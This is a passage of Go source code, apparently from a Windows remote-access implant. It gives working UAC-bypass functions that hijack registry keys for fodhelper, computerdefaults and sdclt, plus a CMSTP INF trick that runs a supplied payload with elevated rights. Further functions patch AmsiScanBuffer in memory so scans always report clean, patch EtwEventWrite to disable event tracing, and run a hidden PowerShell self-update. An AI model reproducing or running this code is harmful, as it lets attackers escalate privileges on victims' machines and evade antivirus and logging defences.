	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("fodhelper: reg add failed: %v %s", err, string(out))
	}

	exec.Command("fodhelper.exe").Start()
	time.Sleep(3 * time.Second)

	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()

	return "fodhelper: UAC bypass executed"
}

func uacBypassComputerDefaults(payload string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	applyHideWindow(cmd)
	cmd.CombinedOutput()

	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("computerdefaults: reg add failed: %v %s", err, string(out))
	}

	exec.Command("computerdefaults.exe").Start()
	time.Sleep(3 * time.Second)

	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()

	return "computerdefaults: UAC bypass executed"
}

func uacBypassSDCLT(payload string) string {
	appPaths := `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`

	cmd := exec.Command("reg", "add", appPaths, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("sdclt: reg add failed: %v %s", err, string(out))
	}

	exec.Command("sdclt.exe", "/KickOffElevation").Start()
	time.Sleep(3 * time.Second)

	exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`, "/f").Run()

	return "sdclt: UAC bypass executed"
}

func uacBypassCMSTP(payload string) string {
	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = "C:\\Windows\\Temp"
	}
	infPath := filepath.Join(tmpDir, "forgeuac.inf")

	infContent := []byte("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=" + payload + "\r\n")
	if err := os.WriteFile(infPath, infContent, 0644); err != nil {
		return fmt.Sprintf("cmstp: write inf failed: %v", err)
	}
	defer os.Remove(infPath)

	exec.Command("cmstp.exe", "/au", infPath).Start()
	time.Sleep(3 * time.Second)

	return "cmstp: UAC bypass executed"
}

// amsiBypass patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN
func amsiBypass() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "AMSI bypass: amsi.dll not loaded (no patch needed)"
	}

	procName := append([]byte("AmsiScanBuffer"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "AMSI bypass: AmsiScanBuffer not found"
	}

	// Patch: mov eax, 1; ret  (B8 01 00 00 00 C3)
	// AMSI_RESULT_CLEAN = 1 → AmsiScanBuffer always reports clean
	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "AMSI bypass: VirtualProtect failed"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "AMSI bypass: AmsiScanBuffer patched → always returns AMSI_RESULT_CLEAN"
}

// etwBypass patches EtwEventWrite in ntdll.dll to return immediately
func etwBypass() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "ETW bypass: ntdll.dll not loaded"
	}

	procName := append([]byte("EtwEventWrite"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "ETW bypass: EtwEventWrite not found"
	}

	// Patch: ret (0xC3) — return immediately, return code is garbage but callers don't check
	patch := []byte{0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "ETW bypass: VirtualProtect failed"
	}

	*(*byte)(unsafe.Pointer(procAddr)) = patch[0]

	return "ETW bypass: EtwEventWrite patched → returns immediately"
}

// selfUpdateWindows replaces the current executable via a PowerShell wrapper
func selfUpdateWindows(exe, tmpPath string) string {
	psScript := fmt.Sprintf(
		`Start-Sleep -Milliseconds 300; `+
			`Copy-Item -Path '%s' -Destination '%s' -Force; `+
			`Start-Process -FilePath '%s';`,
		tmpPath, exe, exe)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	applyHideWindow(cmd)
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}

	return "self-update: new binary downloaded, replacing and restarting..."
}

func selfUpdateLinux(exe, tmpPath string) string {
	return "" // stub for Windows build
}

func selfUpdateDarwin(exe, tmpPath string) string {
	return "" // stub for Windows build
}
